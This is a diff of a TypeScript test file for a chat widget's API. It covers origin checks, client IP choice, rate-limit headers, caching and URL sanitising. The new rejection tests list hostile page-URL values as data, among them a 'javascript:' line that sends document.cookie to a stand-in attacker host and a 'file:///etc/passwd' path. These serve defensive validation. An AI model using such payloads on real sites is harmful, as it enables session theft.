@@ -1,4 +1,4 @@
-import { DEFAULT_WIDGET_THEME } from '@parbot/shared';
+import { DEFAULT_WIDGET_THEME, safeHttpUrl } from '@parbot/shared';
 import { describe, expect, it } from 'vitest';
 import { z } from 'zod';
 
@@ -18,7 +18,10 @@ import {
   originAllowed,
   parseWidgetSettings,
   requestOrigin,
+  retryAfter,
+  widgetChatSchema,
   widgetConfigFor,
+  widgetLeadSchema,
   widgetSettingsOf,
   type WidgetSettings,
 } from './widget-api';
@@ -78,28 +81,52 @@ describe('isOriginAllowed', () => {
 
 describe('isValidOriginEntry', () => {
   it('accepts origins, hostnames, ports and wildcards', () => {
-    for (const entry of ['https://docs.example.com', 'http://localhost:3000', 'docs.example.com', 'localhost:3000', '*.example.com', ' docs.example.com ']) {
+    for (const entry of [
+      'https://docs.example.com',
+      'http://localhost:3000',
+      'docs.example.com',
+      'localhost:3000',
+      '*.example.com',
+      ' docs.example.com ',
+    ]) {
       expect(isValidOriginEntry(entry), entry).toBe(true);
     }
   });
 
   it('rejects paths, queries, odd schemes and garbage', () => {
-    for (const entry of ['', '   ', 'https://docs.example.com/guide', 'https://docs.example.com/?x=1', 'ftp://x.io', 'javascript:alert(1)', 'docs example', '*.', '-bad.io']) {
+    for (const entry of [
+      '',
+      '   ',
+      'https://docs.example.com/guide',
+      'https://docs.example.com/?x=1',
+      'ftp://x.io',
+      'javascript:alert(1)',
+      'docs example',
+      '*.',
+      '-bad.io',
+    ]) {
       expect(isValidOriginEntry(entry), entry).toBe(false);
     }
   });
 });
 
 describe('requestOrigin', () => {
-  const request = (headers: Record<string, string>) => new Request('http://localhost:3000/api/widget/config', { headers });
+  const request = (headers: Record<string, string>) =>
+    new Request('http://localhost:3000/api/widget/config', { headers });
 
   it('prefers the Origin header and normalises it', () => {
-    expect(requestOrigin(request({ origin: 'https://Docs.Example.com/' }))).toBe('https://docs.example.com');
+    expect(requestOrigin(request({ origin: 'https://Docs.Example.com/' }))).toBe(
+      'https://docs.example.com',
+    );
   });
 
   it('falls back to the Referer for same-origin GETs, and treats "null" as absent', () => {
-    expect(requestOrigin(request({ referer: 'http://localhost:3000/demo/pb_x?mode=palette' }))).toBe('http://localhost:3000');
-    expect(requestOrigin(request({ origin: 'null', referer: 'https://a.io/page' }))).toBe('https://a.io');
+    expect(
+      requestOrigin(request({ referer: 'http://localhost:3000/demo/pb_x?mode=palette' })),
+    ).toBe('http://localhost:3000');
+    expect(requestOrigin(request({ origin: 'null', referer: 'https://a.io/page' }))).toBe(
+      'https://a.io',
+    );
     expect(requestOrigin(request({}))).toBeNull();
   });
 });
@@ -122,13 +149,44 @@ describe('corsHeaders and clientIp', () => {
     expect(corsHeaders().vary).toBe('Origin');
   });
 
-  it('takes the first forwarded address', () => {
-    const forwarded = new Request('http://x', { headers: { 'x-forwarded-for': ' 203.0.113.9 , 10.0.0.1' } });
-    const real = new Request('http://x', { headers: { 'x-real-ip': '198.51.100.2' } });
+  it('takes the platform address first, else the last forwarded hop, never the first', () => {
+    const vercel = new Request('http://x', {
+      headers: {
+        'x-vercel-forwarded-for': '198.51.100.7',
+        'x-real-ip': '198.51.100.2',
+        'x-forwarded-for': '203.0.113.9, 10.0.0.1',
+      },
+    });
+    const real = new Request('http://x', {
+      headers: { 'x-real-ip': '198.51.100.2', 'x-forwarded-for': '203.0.113.9, 10.0.0.1' },
+    });
+    const forwarded = new Request('http://x', {
+      headers: { 'x-forwarded-for': ' 203.0.113.9 , 10.0.0.1 ' },
+    });
+    const single = new Request('http://x', { headers: { 'x-forwarded-for': '203.0.113.9' } });
 
-    expect(clientIp(forwarded)).toBe('203.0.113.9');
+    expect(clientIp(vercel)).toBe('198.51.100.7');
     expect(clientIp(real)).toBe('198.51.100.2');
+    expect(clientIp(forwarded)).toBe('10.0.0.1');
+    expect(clientIp(single)).toBe('203.0.113.9');
+    expect(clientIp(new Request('http://x', { headers: { 'x-forwarded-for': ' , ' } }))).toBe(
+      'unknown',
+    );
     expect(clientIp(new Request('http://x'))).toBe('unknown');
+  });
+
+  it('announces the longest wait among the full buckets, in whole seconds, never zero', () => {
+    const open = { allowed: true, remaining: 3, retryAfterMs: 0 };
+
+    expect(retryAfter([open, open])).toBeNull();
+    expect(
+      retryAfter([
+        open,
+        { allowed: false, remaining: 0, retryAfterMs: 1400 },
+        { allowed: false, remaining: 0, retryAfterMs: 30_500 },
+      ]),
+    ).toBe('31');
+    expect(retryAfter([{ allowed: false, remaining: 0, retryAfterMs: 0 }])).toBe('1');
   });
 });
 
@@ -146,9 +204,85 @@ describe('jsonError and configCacheControl', () => {
   });
 
   it('caches a plain config request briefly and a versioned one not at all', () => {
-    expect(configCacheControl(new Request('http://x/api/widget/config?key=pb_1'))).toBe('public, max-age=60');
-    expect(configCacheControl(new Request('http://x/api/widget/config?key=pb_1&v=2'))).toBe('no-store');
-    expect(configCacheControl(new Request('http://x/api/widget/config?key=pb_1&v='))).toBe('no-store');
+    expect(configCacheControl(new Request('http://x/api/widget/config?key=pb_1'))).toBe(
+      'public, max-age=60',
+    );
+    expect(configCacheControl(new Request('http://x/api/widget/config?key=pb_1&v=2'))).toBe(
+      'no-store',
+    );
+    expect(configCacheControl(new Request('http://x/api/widget/config?key=pb_1&v='))).toBe(
+      'no-store',
+    );
+  });
+});
+
+describe('widget request bodies', () => {
+  const chat = {
+    key: PUBLIC_KEY,
+    visitorId: 'v_0123456789abcdef0123456789abcdef',
+    conversationId: '22222222-2222-4222-8222-222222222222',
+    message: 'Hi',
+  };
+  const lead = { key: chat.key, visitorId: chat.visitorId, email: 'ada@example.com' };
+
+  it('keeps an http(s) page url, trimmed', () => {
+    expect(
+      widgetChatSchema.parse({ ...chat, pageUrl: ' https://docs.example.com/a?b=1 ' }).pageUrl,
+    ).toBe('https://docs.example.com/a?b=1');
+    expect(widgetLeadSchema.parse({ ...lead, pageUrl: 'http://localhost:3000/x' }).pageUrl).toBe(
+      'http://localhost:3000/x',
+    );
+    expect(widgetChatSchema.parse(chat).pageUrl).toBeUndefined();
+  });
+
+  it('drops any other page url without refusing the request', () => {
+    for (const pageUrl of [
+      'javascript:alert(1)',
+      "javascript:fetch('//attacker.example/'+document.cookie)",
+      'data:text/html,hi',
+      'file:///etc/passwd',
+      '/relative',
+      'docs.example.com',
+      '',
+      `https://docs.example.com/${'x'.repeat(2048)}`,
+    ]) {
+      const chatResult = widgetChatSchema.safeParse({ ...chat, pageUrl });
+      const leadResult = widgetLeadSchema.safeParse({ ...lead, pageUrl });
+
+      expect(chatResult.success, pageUrl).toBe(true);
+      expect(chatResult.data?.pageUrl, pageUrl).toBeUndefined();
+      expect(leadResult.success, pageUrl).toBe(true);
+      expect(leadResult.data?.pageUrl, pageUrl).toBeUndefined();
+    }
+
+    expect(widgetChatSchema.safeParse({ ...chat, pageUrl: 42 }).success).toBe(false);
+  });
+});
+
+describe('safeHttpUrl', () => {
+  it('passes http and https addresses through and refuses every other scheme', () => {
+    expect(safeHttpUrl('https://docs.example.com/a?b=1#c')).toBe(
+      'https://docs.example.com/a?b=1#c',
+    );
+    expect(safeHttpUrl('  http://localhost:3000  ')).toBe('http://localhost:3000');
+    expect(safeHttpUrl('HTTPS://Docs.Example.com')).toBe('HTTPS://Docs.Example.com');
+
+    for (const value of [
+      'javascript:alert(1)',
+      'JavaScript:alert(1)',
+      'data:text/html,hi',
+      'mailto:a@b.co',
+      'ftp://x.io',
+      '/relative',
+      'https://',
+      'not a url',
+      '',
+      null,
+      undefined,
+      42,
+    ]) {
+      expect(safeHttpUrl(value), String(value)).toBeNull();
+    }
   });
 });
 
@@ -181,7 +315,7 @@ describe('widgetConfigFor', () => {
     });
   });
 
-  it('keeps the owner\'s choices on Starter', () => {
+  it("keeps the owner's choices on Starter", () => {
     expect(widgetConfigFor(assistant, PLANS.starter)).toMatchObject({
       mode: 'palette',
       theme: { scheme: 'dark', accent: '#2563eb', position: 'left', radius: 'lg' },
@@ -194,7 +328,10 @@ describe('widgetConfigFor', () => {
   it('never trusts a malformed theme or mode from the database', () => {
     const odd = { ...assistant, mode: 'sidebar', theme: { accent: 'red' } };
 
-    expect(widgetConfigFor(odd, PLANS.growth)).toMatchObject({ mode: 'bubble', theme: DEFAULT_WIDGET_THEME });
+    expect(widgetConfigFor(odd, PLANS.growth)).toMatchObject({
+      mode: 'bubble',
+      theme: DEFAULT_WIDGET_THEME,
+    });
   });
 });
 
@@ -253,12 +390,17 @@ describe('parseWidgetSettings', () => {
   });
 
   it('explains what is wrong', () => {
-    expect(parseWidgetSettings(form({ ...valid, welcomeMessage: ' ' }))).toEqual({ success: false, error: 'Write a welcome message.' });
+    expect(parseWidgetSettings(form({ ...valid, welcomeMessage: ' ' }))).toEqual({
+      success: false,
+      error: 'Write a welcome message.',
+    });
     expect(parseWidgetSettings(form({ ...valid, suggestedQuestions: '1\n2\n3\n4\n5' }))).toEqual({
       success: false,
       error: 'List at most 4 suggested questions.',
     });
-    expect(parseWidgetSettings(form({ ...valid, allowedOrigins: 'https://docs.example.com/guide' }))).toEqual({
+    expect(
+      parseWidgetSettings(form({ ...valid, allowedOrigins: 'https://docs.example.com/guide' })),
+    ).toEqual({
       success: false,
       error: 'Origins look like https://docs.example.com, docs.example.com or *.example.com.',
     });
@@ -288,10 +430,16 @@ describe('gateWidgetSettings', () => {
 
   it('names the first rule Hobby breaks', () => {
     expect(gateWidgetSettings({ ...base, mode: 'palette' }, PLANS.hobby)).toMatch(/palette/i);
-    expect(gateWidgetSettings({ ...base, theme: { ...base.theme, accent: '#2563eb' } }, PLANS.hobby)).toMatch(/theme/i);
-    expect(gateWidgetSettings({ ...base, theme: { ...base.theme, position: 'left' } }, PLANS.hobby)).toMatch(/theme/i);
+    expect(
+      gateWidgetSettings({ ...base, theme: { ...base.theme, accent: '#2563eb' } }, PLANS.hobby),
+    ).toMatch(/theme/i);
+    expect(
+      gateWidgetSettings({ ...base, theme: { ...base.theme, position: 'left' } }, PLANS.hobby),
+    ).toMatch(/theme/i);
     expect(gateWidgetSettings({ ...base, hideBranding: true }, PLANS.hobby)).toMatch(/branding/i);
-    expect(gateWidgetSettings({ ...base, leadCapture: true }, PLANS.hobby)).toMatch(/lead capture/i);
+    expect(gateWidgetSettings({ ...base, leadCapture: true }, PLANS.hobby)).toMatch(
+      /lead capture/i,
+    );
   });
 
   it('lets Starter use all of them', () => {
@@ -309,9 +457,18 @@ describe('gateWidgetSettings', () => {
 
 describe('widgetSettingsOf and installSnippet', () => {
   it('reads a row into form values, tolerating bad stored data', () => {
-    const settings = widgetSettingsOf(assistantRow({ mode: 'weird', theme: null }) as unknown as Parameters<typeof widgetSettingsOf>[0]);
+    const settings = widgetSettingsOf(
+      assistantRow({ mode: 'weird', theme: null }) as unknown as Parameters<
+        typeof widgetSettingsOf
+      >[0],
+    );
 
-    expect(settings).toMatchObject({ mode: 'bubble', theme: DEFAULT_WIDGET_THEME, hideBranding: true, leadCapture: true });
+    expect(settings).toMatchObject({
+      mode: 'bubble',
+      theme: DEFAULT_WIDGET_THEME,
+      hideBranding: true,
+      leadCapture: true,
+    });
   });
 
   it('builds the script tag against the app url', () => {
@@ -325,13 +482,23 @@ describe('fake service', () => {
   it('filters rows and records inserts, so the route tests can rely on it', async () => {
     const fake = createFakeService({ assistants: [assistantRow()] });
 
-    const found = await fake.client.from('assistants').select('id').eq('public_key', PUBLIC_KEY).maybeSingle();
-    const missing = await fake.client.from('assistants').select('id').eq('public_key', 'pb_nope').maybeSingle();
+    const found = await fake.client
+      .from('assistants')
+      .select('id')
+      .eq('public_key', PUBLIC_KEY)
+      .maybeSingle();
+    const missing = await fake.client
+      .from('assistants')
+      .select('id')
+      .eq('public_key', 'pb_nope')
+      .maybeSingle();
 
     expect(found.data).toMatchObject({ name: 'Docs bot' });
     expect(missing.data).toBeNull();
 
-    const result = await fake.client.from('leads').insert({ assistant_id: 'a', owner_id: 'o', email: 'a@b.co' });
+    const result = await fake.client
+      .from('leads')
+      .insert({ assistant_id: 'a', owner_id: 'o', email: 'a@b.co' });
 
     expect(result.error).toBeNull();
     expect(fake.inserted.leads).toHaveLength(1);
